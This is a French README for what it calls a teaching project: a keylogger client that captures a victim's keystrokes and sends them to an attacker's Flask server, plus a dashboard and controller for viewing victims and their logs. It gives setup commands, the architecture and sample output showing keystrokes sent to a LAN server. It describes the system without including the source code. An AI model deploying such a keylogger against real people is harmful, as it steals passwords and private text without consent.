# A. Description

L'objectif est de passer d'un simple script de capture de frappes à une simulation cybersécurité plus réaliste, composée de plusieurs éléments interconnectés. 

Ceci constitue un projet pédagogique démontrant les risques de sécurité liés aux keyloggers.

Ce projet capture les frappes clavier sur une machine victime et les envoie à un serveur distant pour analyse. Il illustre comment un attaquant peut :

- Capturer les données sensibles (mots de passe, textes, etc.)
- Les transmettre vers un serveur malveillant
- Les consulter à distance via une interface web

⚠️ ATTENTION : À utiliser UNIQUEMENT sur vos propres machines pour apprendre !

# B. Structure du projet 
```
keylogger_project/
├── README.md                    # Cette documentation
│
├── SERVEUR DISTANT ( IP serveur : X.X.X.X)
│   ├── web.py                   # API Backend (port 5000)
│   ├── dashboard.py             # Interface Web (port 8000)
│   └── controller.py            # Contrôleur Console (optionnel)
│
└── MACHINE VICTIME
    └── v3_keylogger_simple.py   # Keylogger Client
```

# C. Installatin & configuration 

- Sur l'hôte de l'attaquant :

1. Installer les dépendances
```

pip3 install flask requests
```
2. Lancer l'API Backend pour la réception des données

Ceci est une étape importante pour nous car l'API nous permettra de recevoir les logs du keylogger lancé sur la machine de la victime. Dans la foulée, les données reçues seront stockées en mémoire et affchées sur le serveur web falsk

```
python3 web.py
```
3. Lancer le Dashboard

Ce script nous permettra d'afficher les victimes dans sur le navigateur tout en ayant une interaction avec les victimes listes. Il reçoit les entrées capturées et exposées sur le port 5000 par le script web.py

```
python3 dashboard.py
```

4. Lancer le Contrôleur pour l'affichage intéractif en CLI

Le controleur nous permmet un affichage intéractif en ligne de commande pour consulter la liste des victimes, les logs qui s'y rapportent depuis la ligne de commande.  
   
```
python3 controller.py --server http://192.168.30.129:5000

```

================================================================================
                         CONTRÔLEUR KEYLOGGER
================================================================================

1. Lister les victimes
2. Voir les logs d'une victime
3. Mode live (streaming)
4. Statistiques
5. Quitter

Choix: 


- Sur l'hôte victime

1. Lancer le script python v3_keylogger.py

Ce script nous permet de capturer les frappes clavier de la victime distante, sauvegarde ces derbières dans un fichier keylog.json pour un envoi ultérieur au serveur distant sur son port 5000.

```
python3 v3_keylogger_simple.py
```
python3 v3_keylloger.py 
[*] ========================================
[*] Keylogger pédagogique (MODE SIMPLE)
[*] ========================================
[*] Victime ID : victime_39198cb1-5c7b-49b4-8d4e-b7458c13202f
[*] Serveur   : http://192.168.30.129:5000/api/logs
[*] Fichier   : keylog.json
[*] 
[*] COMMANDES :
[*]   - Tapez du texte et appuyez sur Entrée
[*]   - Tapez 'send' pour envoyer au serveur
[*]   - Tapez 'quit' pour quitter
[*] 
[*] ========================================


D. Fonctionnement du système 

- Sur l'hôte attaquant

Les touches tapées sur le client keylogger seront enregistrées dans un fichier .json et directement envoyées au serveur distant pour un affichage sur le serveur distant.

Une fois le script python lancé, l'envoi l'est aussi. Il est fait vers le port 5000 du serveur distant.

Le serveur distant écoute sur son port 5000 et lance un serveur web flask sur le port 8000 pour un affichage dans le navigateur.
  
```
CLIENT (Keylogger)
    ↓
    Envoie les touches au PORT 5000
    ↓
SERVEUR 5000 (API Flask)
    ├─ Reçoit les données
    ├─ Les stocke
    └─ Expose /api/victims, /api/logs
    
DASHBOARD 8000 (Interface Web)
    ├─ Consulte le serveur 5000
    ├─ Affiche les données
    └─ Interface pour voir les logs

```
- Sur l'hôte victime :

Sur la machine victime, le script python lancé permettra d'enresgitrer les touches tapées pour les envoyées au serveur distant sur son port d'écoute 5000.

```
1. CAPTURE (on_press)
   └─→ Chaque touche → log_queue

2. ENVOI (sender)
   └─→ Attend 10 touches (BATCH_SIZE)
   └─→ Les envoie au serveur
   └─→ Boucle infinie

3. MAIN
   └─→ Démarre le thread d'envoi
   └─→ Écoute le clavier en continu
```

Pour quitter le script, ctrl+c est la combinaison à taper et avoir la fin de l'enregistrement sur le client.
```
[!] Arrêt du keylogger (Ctrl+C)...
[!] 53 touches capturées

[ENVOI] Envoi de 53 touches au serveur...
[URL] http://192.168.30.129:5000/api/logs
[RESPONSE] {"received":53,"status":"ok"}

[✓] Envoi réussi !
[✓] Fichier keylog.json supprimé
[!] Au revoir!
```
